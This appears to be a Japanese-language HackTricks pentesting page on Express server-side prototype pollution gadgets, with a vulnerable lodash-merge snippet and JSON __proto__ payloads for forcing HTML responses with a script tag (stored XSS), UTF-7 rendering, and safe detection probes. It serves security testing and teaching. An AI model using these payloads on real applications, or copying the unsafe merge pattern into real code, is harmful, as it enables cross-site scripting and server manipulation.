# Express プロトタイプ汚染ガジェット

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## XSSレスポンスを提供する

### JSONのコンテンツタイプをHTMLに変更する

**JSONコンテンツタイプのレスポンス**を使用し、JSONを反映しているExpressアプリで、以下のように変更します：
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
これらの場合、JSONコンテンツタイプでは通常XSSは起こりません。しかし、プロトタイプ汚染を利用することで、**ExpressがHTMLレスポンスを提供するように混乱させることができます。** この脆弱性は、アプリケーションが**`res.send(obj)`**を使用し、application/jsonコンテンツタイプでボディパーサーを使用していることに依存しています。
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
**汚染**することで、**`body`**と**`_body`**の両方のプロパティを汚染することができ、これによりExpressはHTMLコンテンツタイプを提供し、`_body`プロパティを反映させることができ、それにより保存型XSSが発生する可能性があります。

### UTF7のレンダリング

ExpressがUTF-7コンテンツを**レンダリングすることが可能**です。
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## 安全なスキャン技術

### JSONスペース

以下のPPは、JSON内の属性に追加のスペースを持たせ、機能を壊さないようにします：
```json
{"__proto__":{"json spaces": " "}}
```
次に、反射されたJSONは次のようになります：
```json
{"foo":  "bar"} -- Note the extra space
```
### 公開されたヘッダー

次のPPガジェットにより、サーバーはHTTPヘッダーを送信します: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
**CORSモジュールのインストールが必要です**

### **OPTIONSメソッド**

次のペイロードを使用すると、**OPTIONSレスポンスからメソッドを隠す**ことができます：
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **ステータス**

以下のPPペイロードを使用して、**返されるステータスコード**を変更することが可能です：
```json
{"__proto__":{"status":510}}
```
### エラー

プロトタイプに文字列などのプリミティブを割り当てると、プロトタイプはオブジェクトである必要があるため、**no-op操作が生成されます**。`Object.prototype`自体にプロトタイプオブジェクトを割り当てようとすると、これは**例外をスローします**。これらの2つの動作を使用して、**プロトタイプ汚染が成功したかどうかを検出**することができます。
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### 反射された値

アプリケーションがレスポンスでオブジェクトを反映している場合、**奇妙な名前と`__proto__`**を持つ属性を作成するだけで、**奇妙な属性のみが反映される**場合、ウェブに脆弱性がある可能性があります。
```json
{"hacktricks":"rocks","__proto__":"test"}
```
または、Lodashや同様のライブラリが使用されている場合、**PPを介してオブジェクト内にプロパティを設定**することができます。そして、そのプロパティが反映されない場合は、Lodashはマージされたオブジェクト内にプロパティが既に存在するかどうかを現在のオブジェクトで確認します。
```javascript
{"__proto__":{"a":"asd"},"a":"asd2","b":"dfg"}
// If only b is reflected then PP in Lodash
```
## その他

### ドットを許可する

Expressには、**クエリ文字列パラメータからオブジェクトを作成する**オプションがあります。\
これは、**プロトタイプ汚染の脆弱性**を悪用するためのバグ**チェーン**で確かに使用できます。
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` Nodeでオブジェクトを作成します。**

## 参考文献

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** HackTricksで**会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
